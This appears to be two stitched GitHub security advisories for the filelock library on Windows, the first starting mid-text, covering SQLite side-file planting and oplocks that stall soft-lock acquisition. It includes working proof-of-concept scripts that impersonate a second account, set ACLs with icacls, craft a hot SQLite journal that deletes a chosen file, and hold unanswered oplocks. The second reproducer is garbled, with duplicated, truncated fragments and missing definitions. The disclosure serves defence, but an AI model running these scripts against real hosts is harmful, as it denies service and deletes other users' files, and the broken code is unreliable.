Scanned commit `b831496b0273`: the [Windows branch of `_connect`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L951-L965) checks the database through a handle and then calls `sqlite3.connect(database, ...)` with the path. [`_open_lock_database`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1079-L1091) and [`_raise_if_wal`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1094-L1101) inspect that handle, not the side files. The first statement is [`PRAGMA busy_timeout=...; PRAGMA journal_mode=MEMORY;` at L816](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L816). [`_do_acquire_inner` at L763](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L763) turns only `"database is locked"` into `Timeout`; any other `sqlite3.OperationalError` leaves the acquire.

## Introduced

[cfd4446](https://github.com/tox-dev/filelock/commit/cfd4446) "feat(lock): add SQLite-based ReadWriteLock" ([#399](https://github.com/tox-dev/filelock/pull/399), 2026-02-12), first tag 3.20.4 (verified with `git tag --contains`), passed the lock path to `sqlite3.connect` on every platform. The Linux descriptor route (4.0.9) and the macOS hard-link route (4.1.1) did not change Windows, where the connect has been by name in every release since. The reproducer ran against the head of PR #834 at `1f9e415`, whose Windows branch of `_connect` is the same code as at `b831496b0273`.

## Mechanism

`_connect` on Windows opens the database with `_open_non_reparse_fd`, checks through that handle that the file is a regular file, not a reparse point, and that its header does not declare WAL mode, and keeps the handle open while `sqlite3.connect(database)` opens the same name. The check covers the database, not the names beside it. On the first statement, `PRAGMA journal_mode=MEMORY`, SQLite takes its first lock on the database and looks for `<database>-wal`. A non-empty `-wal` beside a database that is not in WAL mode is a leftover SQLite deletes. The other account's file denies `DELETE`, so the pragma raises `SQLITE_IOERR_DELETE`, which reaches the caller as `sqlite3.OperationalError: disk I/O error`. `_do_acquire_inner` converts only "database is locked" into `Timeout`, so `acquire_read()`, `acquire_write()` and the async forms raise at once, on every call, until the file is gone. The lock user has no right to delete it.

The journal variant needs a database with content. Beside a non-empty database SQLite treats a `<database>-journal` with a valid header as hot (left by an interrupted write) and replays it before the first statement runs. The review's journal is 46 bytes: a file path, its 4-byte length, the 4-byte sum of its bytes and SQLite's journal magic. That tail names a super-journal, and recovery ends by deleting the file it names. The lock user's `write_lock()` therefore deletes one file the other account chose, provided the lock user can delete it, and returns without error. SQLite opens a hot journal for writing, so the other account's journal must grant the lock account modify rights; a read-only journal makes every acquire raise `sqlite3.OperationalError: unable to open database file` instead. GHSA-v4x8-3wr5-3wq8 describes the same side-file behavior on POSIX, where the sticky bit plays the part the directory ACL plays here.

## Reproduction

The review's reproducer, quoted as received except for the second account's password on line 2, replaced by `<password>`. It ran on a Windows 11 VM (NTFS, CPython 3.14, SQLite 3.53.1) against the head of PR #834 at `1f9e415`, as the administrator account `bernat`, which stands in for the other account that creates the side files; the lock account is `fltester`, a member of `Users`, whose database lives in `C:\Windows\Temp`.

**`win_two_accounts.py`**

```python
# Run from /tmp/claude-1000/-home-bernat-git-filelock-filelock-main/3ccf38c2-14f9-4acc-a05f-18230504d7cd/scratchpad/review4/D/834 (the script is staged there):
#   winvm up && winvm sync && winvm run "python3.14 -I win_two_accounts.py . fltester '<password>'"
# which runs, as the administrator account on the VM:
#   python3.14 -I win_two_accounts.py <worktree> <second-user> <password>
# The second (non-administrator) account is the lock user. Its database lives in C:\Windows\Temp, where every account
# may create files but not delete another account's. This administrator account stands in for the other account that
# plants SQLite side files there: it creates them, grants everyone read, and denies everyone delete, all of which the
# file's creator may do.
import ctypes
import os
import pathlib
import sqlite3
import struct
import subprocess
import sys
from ctypes import wintypes

sys.path.insert(0, sys.argv[1] + "/src")
from filelock import ReadWriteLock

user, password = sys.argv[2], sys.argv[3]
base = pathlib.Path(os.environ["SYSTEMROOT"]) / "Temp"
icacls = os.path.join(os.environ["SYSTEMROOT"], "System32", "icacls.exe")
tag = f"rw834-{os.getpid()}"
advapi32 = ctypes.WinDLL("advapi32", use_last_error=True)
advapi32.LogonUserW.argtypes = [wintypes.LPCWSTR, wintypes.LPCWSTR, wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD, ctypes.POINTER(wintypes.HANDLE)]
advapi32.GetUserNameW.argtypes = [wintypes.LPWSTR, ctypes.POINTER(wintypes.DWORD)]
token = wintypes.HANDLE()
if not advapi32.LogonUserW(user, ".", password, 3, 0, ctypes.byref(token)):
    raise ctypes.WinError(ctypes.get_last_error())


def current_user() -> str:
    size = wintypes.DWORD(256)
    buffer = ctypes.create_unicode_buffer(size.value)
    advapi32.GetUserNameW(buffer, ctypes.byref(size))
    return buffer.value


def as_lock_user(action):
    if not advapi32.ImpersonateLoggedOnUser(token):
        raise ctypes.WinError(ctypes.get_last_error())
    try:
        return action()
    finally:
        advapi32.RevertToSelf()


def plant(path: pathlib.Path, data: bytes, *, deletable: bool) -> None:
    path.write_bytes(data)
    subprocess.run([icacls, str(path), "/grant", "*S-1-1-0:(M)"], check=True, capture_output=True)
    if not deletable:
        subprocess.run([icacls, str(path), "/deny", "*S-1-1-0:(D)"], check=True, capture_output=True)


def acquire(db: pathlib.Path) -> str:
    try:
        with ReadWriteLock(db, is_singleton=False).write_lock(timeout=1):
            pass
    except Exception as error:
        return f"acquire failed: {type(error).__name__}: {error}"
    return "acquired"


def hot_journal(super_journal: pathlib.Path) -> bytes:
    name = os.fsencode(str(super_journal))
    return name + struct.pack(">II", len(name), sum(name)) + bytes.fromhex("d9d505f920a163d7")


print("planting account:", current_user(), "| lock account:", as_lock_user(current_user))

db = base / f"{tag}-empty.db"
as_lock_user(lambda: db.touch())
plant(pathlib.Path(f"{db}-wal"), b"\0" * 32, deletable=False)
print("empty database, undeletable -wal:", as_lock_user(lambda: acquire(db)), "| -wal still exists:", pathlib.Path(f"{db}-wal").exists())

for deletable in (True, False):
    db = base / f"{tag}-tables-{deletable}.db"
    notes = base / f"{tag}-notes-{deletable}.txt"

    def prepare() -> None:
        with sqlite3.connect(db) as connection:
            connection.execute("CREATE TABLE application (value)")
        connection.close()
        notes.write_text("keep")

    as_lock_user(prepare)
    plant(pathlib.Path(f"{db}-journal"), hot_journal(notes), deletable=deletable)
    print(f"database with a table, {'deletable' if deletable else 'undeletable'} -journal naming the lock account's file:",
          as_lock_user(lambda: acquire(db)), "| named file still exists:", notes.exists(), "| -journal still exists:", pathlib.Path(f"{db}-journal").exists())
```

Recorded output on the VM:

```text
planting account: bernat | lock account: fltester
empty database, undeletable -wal: acquire failed: OperationalError: disk I/O error | -wal still exists: True
database with a table, deletable -journal naming the lock account's file: acquired | named file still exists: False | -journal still exists: False
database with a table, undeletable -journal naming the lock account's file: acquire failed: OperationalError: unable to open database file | named file still exists: True | -journal still exists: True
```

## Failure sequence

```mermaid
flowchart TD
    P["other account: create lock.db-wal (or lock.db-journal) beside lock.db in C:/Windows/Temp, grant everyone modify, deny everyone DELETE"] --> C["lock user: ReadWriteLock(lock.db).write_lock(timeout=1)"]
    C --> O["_open_lock_database checks the handle: regular file, no reparse point, header not WAL"]
    O --> S["sqlite3.connect(lock.db) by path, then PRAGMA journal_mode=MEMORY"]
    S -- "empty database, undeletable -wal" --> E1["SQLite cannot delete the leftover -wal: OperationalError disk I/O error on every acquire, timeout not consulted"]
    S -- "database with a table, writable -journal" --> E2["SQLite treats the journal as hot, replays it and deletes the file its tail names, acquire succeeds"]
    S -- "database with a table, read-only -journal" --> E3["OperationalError unable to open database file on every acquire"]
    classDef ok fill:#d8f3dc,stroke:#2d6a4f,color:#1b4332;
    classDef bad fill:#ffd6d6,stroke:#c1121f,color:#5c0000;
    classDef info fill:#cfe4ff,stroke:#1f6feb,color:#0b1f3a;
    class P,C,O,S info;
    class E1,E2,E3 bad;
```

## Evidence

The reproducer printed the three lines above on the VM: the undeletable `-wal` beside an empty database made `write_lock(timeout=1)` fail with `OperationalError: disk I/O error` and left the file in place; the writable journal beside a database with one table let the acquire succeed while the file the journal named, created by the lock account with the content `keep`, was gone along with the journal; the read-only journal made the acquire fail with `OperationalError: unable to open database file` and left both files. The review notes that the Windows branch of `_connect` is unchanged since #399, so the behavior is the same at `b831496b0273` and in 4.2.0. The scanner and the maintainers measured the same side-file effects on Linux for GHSA-v4x8-3wr5-3wq8.

## Impact

In a directory such as `C:\Windows\Temp`, another local account turns every `read_lock()` and `write_lock()` on a `ReadWriteLock` database into an immediate `sqlite3.OperationalError`, for as long as its file stays. Callers that handle `Timeout` or `OSError` do not catch it, and the lock user cannot remove the file. With a lock database that holds a table and a journal the lock user can write, the lock user's process deletes one file of the other account's choosing, among the files the lock user may delete, and the acquire reports success. The lock's own database is not changed, nothing is read, and mutual exclusion between processes that acquire the lock holds.

## Workarounds

- Keep the `ReadWriteLock` database in a directory other accounts cannot create files in: `%LOCALAPPDATA%`, the per-user temporary directory (`%TEMP%` of a user session), or a directory with inheritance removed and only the owner, `SYSTEM` and `Administrators` granted. `C:\Windows\Temp` and `C:\Users\Public` do not qualify.
- Treat `sqlite3.OperationalError: disk I/O error` on every acquire as a foreign `<database>-wal` beside the database, which only its creator or an administrator can remove.

## Patched version

4.2.1.

Fix: https://github.com/tox-dev/filelock/pull/854

Found by the maintainers while reviewing the fix for the POSIX form of this defect, GHSA-v4x8-3wr5-3wq8, reported by Anthropic's OSS Scanner on 15 October 2026 (review round 4, set D, finding F2).

titolo: GHSA-567q-5qvw-pf92: filelock: On Windows an oplock on a soft lock's marker holds SoftFileLock.acquire() past its timeout and blocks the stale break
descrizione:
On Windows the soft locks (`SoftFileLock`, `MarkerSoftFileLock`, `SoftFileLease`, their async forms, and a `FileLock` that fell back to a soft lock) read their marker by path. The marker is the lock file whose presence says a process holds the lock. Each `acquire()` attempt that finds a marker opens it with `os.open` to read the holder's process id, and the lock renames and deletes a marker it judges stale, by path. On Windows each of these calls waits for an oplock. An oplock (opportunistic lock) is a request by a process that holds a handle on a file to be told before another process opens, renames or deletes that file; the other process waits until the holder answers the break or closes its handle.

Another local account that can open the marker for reading can take a Level 1 oplock on it while no process holds it open, and leave the break unanswered. Every `acquire()` by the user running the lock (below: the lock user) then waits inside the open, past its `timeout`, `blocking=False` and `cancel_check`, and a stale marker under that oplock is not broken. Mutual exclusion holds and the lock touches no other file. Affected versions are filelock 3.22.0 through 4.2.0 on Windows. The maintainers found this while reviewing the fix for the report Anthropic's OSS Scanner sent on 15 October 2026 (review round 4, finding F4); it is not among the scanner's findings.

## Severity

**CVSS 3.1 `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L` scores 2.5 (Low).**

`AV:L` (local): the other account needs a logon on the same host. `AC:H` (high attack complexity): Windows grants a Level 1 or batch oplock only to the sole open handle on a file, so the marker must have no holder handle when the other account asks. That account cannot bring this about; it waits for a holder that died, closed its descriptor, or left a marker past its `lifetime`. `PR:L` (low privileges): an ordinary account with read access to the marker through the directory's inherited ACL (access control list). `UI:N` (no user interaction). `S:U` (scope unchanged). `C:N` and `I:N`: that account can read the marker's content (process id and host name) anyway, and mutual exclusion holds. `A:L` (partial availability impact): one thread, or the event loop with `run_in_executor=False`, waits until the holder answers; 10 s per attempt in the two-account runs, no crash. Metrics in doubt take the lower reading.

Classification from the review: **security, conditional** on an unheld marker that another account can open.

## Scope and preconditions

- Platform and classes: Windows only. `SoftFileLock`, `MarkerSoftFileLock`, `SoftFileLease`, `AsyncSoftFileLock` and the other async soft locks, and `FileLock` after its `ENOSYS` fallback to a soft lock. `WindowsFileLock` opens its lock file on a separate code path that this advisory does not cover.
- Marker access: the soft locks create the marker with `os.open`, which on Windows applies no more of `mode` than the read-only attribute (GHSA-8mx5-7m5m-r77g). The marker carries the lock directory's inheritable entries. Another account that those entries grant read access to new files can open the marker with a read handle that shares read, write and delete.
- Unheld marker: no handle may be open on the marker when the other account requests the oplock. That is a holder that died and left its marker, a holder that closed its descriptor, or a marker whose `lifetime` has passed. While the holder keeps its handle, the request fails.
- Holder behavior: the other account requests the oplock through an overlapped `DeviceIoControl` and never acknowledges the break. Windows cancels a thread's pending request when the thread exits, so the holder thread stays alive. A same-account process that answers slowly, such as an indexer, has the same effect for its answer time.
- What the lock user sees: `SoftFileLock.acquire(timeout=1)` returned `Timeout` after 10.02 s with the second account's handle. In the same-account probe `os.open` with `O_RDONLY` was still running after 15 s and returned once the holder closed. The retry loop consults `timeout`, `blocking=False` and `cancel_check` between attempts only. With `AsyncSoftFileLock(run_in_executor=False)` the event loop waits.
- Stale break: `break_lock_file` renames and unlinks by path. Both calls wait in the same way, so a stale marker under such an oplock stays, and no process acquires the lock until the holder closes.
- Not affected: mutual exclusion, and the lock reads, writes and deletes no file other than the marker.

## Affected code

Scanned commit `b831496b0273`: the [`os.open` in `_read_lock_file`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L323) ([function](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L312-L335)), called from [`_try_break_stale_lock`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L107-L123) on every attempt that finds a marker, and from [`_unprobeable_holder`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L137), [`pid`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L164) and [`is_lock_held_by_us`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L179). [`break_lock_file`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_util.py#L84-L122) renames at L116 and unlinks at L118 and L122, by path. [`_poll_until_acquired`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_api.py#L1378-L1408) and [`_check_give_up`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_api.py#L1590-L1608) test the deadline, `blocking` and `cancel_check` only between attempts.

## Introduced

[e35c3af](https://github.com/tox-dev/filelock/commit/e35c3af) "feat(soft): detect and break stale locks" ([#476](https://github.com/tox-dev/filelock/pull/476), 2026-02-13), first tag 3.22.0 (verified with `git tag --contains`). Before it a soft lock created its marker with `O_CREAT | O_EXCL` and never opened an existing one. #476 read the marker on Windows through `CreateFileW` and broke a stale one with `Path.rename` and `Path.unlink`. These wait for an oplock as `os.open` does, because none of them passes `FILE_COMPLETE_IF_OPLOCKED`, an `NtCreateFile` option that returns instead of waiting. The read became the `os.open` in `_read_lock_file` with [bfbfa76](https://github.com/tox-dev/filelock/commit/bfbfa76) ([#548](https://github.com/tox-dev/filelock/pull/548), 3.29.1) and the break moved into `break_lock_file` with [d244c6d](https://github.com/tox-dev/filelock/commit/d244c6d) ([#551](https://github.com/tox-dev/filelock/pull/551), 3.29.2); the by-path calls stayed.

## Mechanism

Each attempt of `_acquire` first calls `os.open(path, O_WRONLY | O_CREAT | O_EXCL)`. On an existing marker that fails with `EEXIST` (or `EACCES` on Windows) at once; the same-account probe shows the failed exclusive create returning at once under an oplock too. `_acquire` then calls `_try_break_stale_lock`, which calls `_read_lock_file`: `os.lstat`, then `os.open(path, O_RDONLY | O_NOFOLLOW | O_NONBLOCK)`. On Windows `O_NOFOLLOW` and `O_NONBLOCK` do not exist (the code reads them with `getattr(os, ..., 0)`), and `os.open` calls `CreateFileW`. When another handle holds a Level 1 or batch oplock on the file, that call sends the holder a break request and returns only when the holder acknowledges it or closes its handle. `_check_give_up` tests the deadline after the attempt returns, so the wait overruns `timeout`, `blocking=False` and `cancel_check` by its length. Once the open returns, the attempt ends and `_check_give_up` raises `Timeout`, because the deadline has passed.

A marker whose holder is gone takes the second path. `break_lock_file` renames it to a break name and unlinks it, by path. On Windows the rename and the delete open the file with delete access, which breaks a Level 1 or batch oplock the same way; the same-account probe shows `os.rename` and `os.unlink` still running after 15 s and returning once the holder closed. The `lifetime` break at L123 runs the same function. A stale marker under such an oplock is therefore not removed, and every attempt by every process waits inside the read. The other account can request the oplock again as soon as the lock user's handle closes, between two attempts or two `acquire()` calls, as in the Linux lease case of GHSA-7hmp-gf99-57hx. Nothing in the retry loop bounds this wait.

## Reproduction

The review's reproducers, quoted as received. `oplock_vm.py` section `[2]` is this finding; sections `[1a]` and `[1b]` belong to the `release()` advisory. `oplock_semantics_vm.py` is the same-account probe of which path operations wait. They ran on a Windows 11 VM (NTFS, CPython 3.14.8) against the head of PR #835 at `3e4c5ef`, where `_read_lock_file` and `break_lock_file` are the same code as at `b831496b0273` apart from import changes. The second account `fltester` is a member of `Users`; the directory grants it `(OI)(CI)(M)`.

**`oplock_vm.py`**

Windows oplock checks beyond the lock-file open PR #835 changes: release() and the soft locks' marker read.

Run on the VM (PowerShell, from the synced worktree, with the fltester account present):
  C:\\venvs\\rev4F\\Scripts\\python.exe oplock_vm.py fltester '<password>' C:\\tmp\\rev4F-oplock

[1] A second account keeps requesting a Level 1 oplock on the lock file through a read handle that shares delete.
    WindowsFileLock._release closes its handle and then unlinks by path; an oplock granted in between makes the
    DeleteFileW inside os.unlink wait for the holder's acknowledgement. [1a] races the close-to-unlink window as is;
    [1b] widens that window to 200 ms with a patched os.unlink so the grant lands inside it.
[2] A second account holds a Level 1 oplock on a soft-lock marker whose holder is alive. SoftFileLock.acquire reads the
    marker through os.open, which waits for the acknowledgement, past timeout=1.

A thread that exits has its pending oplock request cancelled, so every holder thread stays alive until the end.

import os
import subprocess
import sys
import threading
import time
from ctypes import wintypes

from filelock import FileLock, SoftFileLock, Timeout

user, password, base = sys.argv[1], sys.argv[2], sys.argv[3]

os.makedirs(base, exist_ok=True)
subprocess.run([icacls, base, "/grant", f"{user}:(OI)(CI)(M)"], check=True, capture_output=True)

advapi32 = ctypes.WinDLL("advapi32", use_last_error=True)
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
advapi32.LogonUserW.argtypes = [
    wintypes.LPCWSTR,
    wintypes.LPCWSTR,
    wintypes.LPCWSTR,
    wintypes.DWORD,
    wintypes.DWORD,
    ctypes.POINTER(wintypes.HANDLE),
]
kernel32.CreateFileW.restype = kernel32.CreateEventW.restype = wintypes.HANDLE
kernel32.CreateFileW.argtypes = [
    wintypes.LPCWSTR,
    wintypes.DWORD,
    wintypes.DWORD,
    ctypes.c_void_p,
    wintypes.DWORD,
    wintypes.DWORD,
    wintypes.HANDLE,
]


class Overlapped(ctypes.Structure):
    _fields_ = (
        ("Internal", ctypes.c_void_p),
        ("InternalHigh", ctypes.c_void_p),
        ("Offset", wintypes.DWORD),
        ("OffsetHigh", wintypes.DWORD),
        ("hEvent", wintypes.HANDLE),
    )


kernel32.DeviceIoControl.argtypes = [
    wintypes.HANDLE,
    wintypes.DWORD,
    ctypes.c_void_p,
    wintypes.DWORD,
    ctypes.c_void_p,
    wintypes.DWORD,
    ctypes.c_void_p,
    ctypes.POINTER(Overlapped),
]
kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
kernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]

GENERIC_READ = 0x80000000
SHARE_ALL = 0x7
OPEN_EXISTING = 3
FLAG_OVERLAPPED = 0x40000000
INVALID_HANDLE = wintypes.HANDLE(-1).value
FSCTL_REQUEST_OPLOCK_LEVEL_1 = 0x00090000
ERROR_IO_PENDING = 997
hold = threading.Event()
real_unlink = os.unlink


def impersonate() -> None:
    token = wintypes.HANDLE()
    if not advapi32.LogonUserW(user, ".", password, 3, 0, ctypes.byref(token)):
        raise ctypes.WinError(ctypes.get_last_error())
    if not advapi32.ImpersonateLoggedOnUser(token):
        raise ctypes.WinError(ctypes.get_last_error())


def request_level1(path: str) -> tuple[int, Overlapped] | None:
    handle = kernel32.CreateFileW(path, GENERIC_READ, SHARE_ALL, None, OPEN_EXISTING, FLAG_OVERLAPPED, None)
    if handle == INVALID_HANDLE:
        return None
    overlapped = Overlapped(hEvent=kernel32.CreateEventW(None, True, False, None))
    if (
        not kernel32.DeviceIoControl(handle, FSCTL_REQUEST_OPLOCK_LEVEL_1, None, 0, None, 0, None, ctypes.byref(overlapped))
        and ctypes.get_last_error() == ERROR_IO_PENDING
    ):
        return handle, overlapped
    kernel32.CloseHandle(handle)
    kernel32.CloseHandle(overlapped.hEvent)
    return None


def drop(granted: tuple[int, Overlapped]) -> None:
    handle, overlapped = granted
    kernel32.CloseHandle(handle)
    kernel32.WaitForSingleObject(overlapped.hEvent, 5000)
    kernel32.CloseHandle(overlapped.hEvent)


def release_under_oplock_requests(label: str, lock_path: str, cycles: int) -> bool:
    stop = threading.Event()
    granted_box: list[tuple[int, Overlapped]] = []

    def spinner() -> None:
        impersonate()
        while not stop.is_set():
            if (granted := request_level1(lock_path)) is not None:
                granted_box.append(granted)
                hold.wait()
                return

    releasing = threading.Event()
    release_durations: list[float] = []

    def owner() -> None:
        # thread_local locks release only on the acquiring thread, so acquire and release stay on this one
        for _ in range(cycles):
            lock = FileLock(lock_path, is_singleton=False)
            lock.acquire(timeout=5)
            started = time.monotonic()
            releasing.set()
            lock.release()
            releasing.clear()
            release_durations.append(time.monotonic() - started)
            if granted_box:
                return

    holder = threading.Thread(target=spinner, daemon=True)
    holder.start()
    owner_thread = threading.Thread(target=owner, daemon=True)
    owner_thread.start()
    owner_thread.join(60)
    stalled = owner_thread.is_alive() and releasing.is_set()
    stop.set()
    longest = max(release_durations, default=0.0) * 1000
    print(f"  {label}: oplock granted: {bool(granted_box)}; cycles run: {len(release_durations)}; longest release: {longest:.1f} ms")
    if stalled:
        print("  release() still running after 60 s while the oplock holder has not answered the break")
        if granted_box:
            drop(granted_box[0])
        owner_thread.join(10)
        print(f"  release() returned after the holder closed its handle: {not owner_thread.is_alive()}")
    return stalled


print("[1a] release() against a second account that keeps requesting a Level 1 oplock, natural window")
stalled_native = release_under_oplock_requests("natural", os.path.join(base, "native.lock"), 500)

print("[1b] the same, with the window between the handle close and the unlink widened to 200 ms")


def slow_unlink(path: str, *, dir_fd: int | None = None) -> None:
    time.sleep(0.2)
    real_unlink(path, dir_fd=dir_fd)


os.unlink = slow_unlink
stalled_scheduled = release_under_oplock_requests("scheduled", os.path.join(base, "native-scheduled.lock"), 20)
os.unlink = real_unlink

print("[2] SoftFileLock.acquire(timeout=1) against a second account's Level 1 oplock on a live marker")
marker = os.path.join(base, "soft.lock")
holder = SoftFileLock(marker, is_singleton=False)
holder.acquire()
holder_fd = holder._context.lock_file_fd  # noqa: SLF001
os.close(holder_fd)  # the marker stays with a live PID, as after a holder that lost only its handle
impersonate_done = threading.Event()
granted_soft: list[tuple[int, Overlapped]] = []


def take_soft_oplock() -> None:
    impersonate()
    if (granted := request_level1(marker)) is not None:
        granted_soft.append(granted)
    impersonate_done.set()
    hold.wait()


threading.Thread(target=take_soft_oplock, daemon=True).start()
impersonate_done.wait(5)
print(f"  oplock granted: {bool(granted_soft)}")
outcome = ["still running after 25 s"]


def contend() -> None:
    started = time.monotonic()
    try:
        SoftFileLock(marker, is_singleton=False).acquire(timeout=1)
        outcome[0] = f"acquired after {time.monotonic() - started:.2f} s"
    except Timeout:
        outcome[0] = f"Timeout after {time.monotonic() - started:.2f} s"
    except OSError as error:
        outcome[0] = f"{type(error).__name__} after {time.monotonic() - started:.2f} s: {error}"


contender = threading.Thread(target=contend, daemon=True)
contender.start()
contender.join(25)
print(f"  contender: {outcome[0]}")
soft_stalled = "still running" in outcome[0]
if granted_soft:
    drop(granted_soft[0])
    contender.join(10)
    print(f"  after the holder closed: {outcome[0]}")
hold.set()
print("STALLS" if stalled_native or stalled_scheduled or soft_stalled else "BOUNDED")

import time

    wintypes.DWORD,

    wintypes.DWORD,
    wintypes.DWORD,
    wintypes.HANDLE,
]


class Overlapped(ctypes.Structure):

        ("Internal", ctypes.c_void_p),
        ("InternalHigh", ctypes.c_void_p),
        ("Offset", wintypes.DWORD),
        ("OffsetHigh", wintypes.DWORD),
        ("hEvent", wintypes.HANDLE),
    )


kernel32.DeviceIoControl.argtypes = [
    wintypes.HANDLE,
    wintypes.DWORD,
    ctypes.c_void_p,
    wintypes.DWORD,
    ctypes.c_void_p,
    wintypes.DWORD,
    ctypes.c_void_p,
    ctypes.POINTER(Overlapped),

kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
kernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
GENERIC_READ, GENERIC_WRITE = 0x80000000, 0x40000000
SHARE_ALL, OPEN_EXISTING, FLAG_OVERLAPPED = 0x7, 3, 0x40000000
INVALID_HANDLE = wintypes.HANDLE(-1).value
LEVELS = {"level1": 0x00090000, "batch": 0x00090008}


def take(path: str, level: str) -> tuple[int, Overlapped]:
    handle = kernel32.CreateFileW(path, GENERIC_READ, SHARE_ALL, None, OPEN_EXISTING, FLAG_OVERLAPPED, None)
    overlapped = Overlapped(hEvent=kernel32.CreateEventW(None, True, False, None))
    pending = not kernel32.DeviceIoControl(handle, LEVELS[level], None, 0, None, 0, None, ctypes.byref(overlapped))
    assert pending and ctypes.get_last_error() == 997, ctypes.get_last_error()

def drop(granted: tuple[int, Overlapped]) -> None:
    kernel32.CloseHandle(granted[0])
    kernel32.WaitForSingleObject(granted[1].hEvent, 5000)
    kernel32.CloseHandle(granted[1].hEvent)


def timed(label: str, operation) -> None:  # noqa: ANN001
    done = threading.Event()
    result = ["still running after 15 s"]

    def run() -> None:
        started = time.monotonic()
        try:
            operation()
            result[0] = f"returned after {(time.monotonic() - started) * 1000:.1f} ms"
        except OSError as error:
            result[0] = f"{type(error).__name__} after {(time.monotonic() - started) * 1000:.1f} ms: {error}"
        done.set()

    threading.Thread(target=run, daemon=True).start()
    done.wait(15)
    print(f"  {label}: {result[0]}")
    return done

    os.close(os.open(path, os.O_RDONLY | os.O_BINARY))


def open_write(path: str) -> None:
    os.close(os.open(path, os.O_RDWR | os.O_BINARY))


def create_new(path: str) -> None:
    os.close(os.open(path, os.O_WRONLY | os.O_CREAT | os.O_EXCL | os.O_BINARY))


for level in LEVELS:
    for label, operation, consumes in (
        ("os.open O_RDONLY", open_read, False),
        ("os.open O_RDWR", open_write, False),
        ("os.open O_CREAT|O_EXCL on the existing file", create_new, False),
        ("os.utime by path", lambda p: os.utime(p, None), False),
        ("os.rename", lambda p: os.rename(p, p + ".moved"), True),

        print(f"    after the holder closed: {'done' if done.is_set() else 'still running'}")

## Evidence

Section `[2]` of `oplock_vm.py` acquired `soft.lock` as the test account, closed the holder's descriptor so the marker stayed with a live process id and no open handle, took a Level 1 oplock through the second account's read handle (`oplock granted: True`), and ran `SoftFileLock(marker, is_singleton=False).acquire(timeout=1)` on a thread. The call returned `Timeout` after 10.02 s, before the holder closed. The review did not establish what ends the wait at 10 s in the two-account runs; section `[1a]` of the same script, with the second account's handle, shows the same 10 s. In the same-account probe (`oplock_semantics_vm.py`) the open returned only when the holder closed, still running at 15 s. The probe also shows that the failed exclusive create and `os.utime` by path return at once, so the wait is in the read and the break, not in the create attempt.

## Impact

Each `acquire()` of a soft lock that finds a marker another account holds an oplock on runs past its `timeout`, `blocking=False` and `cancel_check` until the holder answers or closes, 10 s per attempt in the recorded two-account runs. A stale marker under that oplock is not broken, so no process acquires the lock while the holder keeps its handle. With `AsyncSoftFileLock(run_in_executor=False)` the wait is on the event loop thread and stops every task in the process; with the default executor one worker thread waits. The documentation names a soft lock as the option for network filesystems, after verification on the mount, and `FileLock` is a soft lock on builds without `fcntl` and after its `ENOSYS` fallback. Mutual exclusion is not affected and nothing other than the marker is read, written or deleted.

## Workarounds

- Keep soft-lock markers in a directory whose ACL grants other accounts no access to new files: a directory inside the user profile, or one with inheritance removed and only the owner, `SYSTEM` and `Administrators` granted (`icacls <dir> /inheritance:r /grant:r "<owner>:(OI)(CI)F" "SYSTEM:(OI)(CI)F" "Administrators:(OI)(CI)F"`). `mode` does not do this on Windows.
- Run `AsyncSoftFileLock` with the default executor rather than `run_in_executor=False`, so that only a worker thread waits.
- No `timeout`, `blocking` or `cancel_check` value bounds the wait.
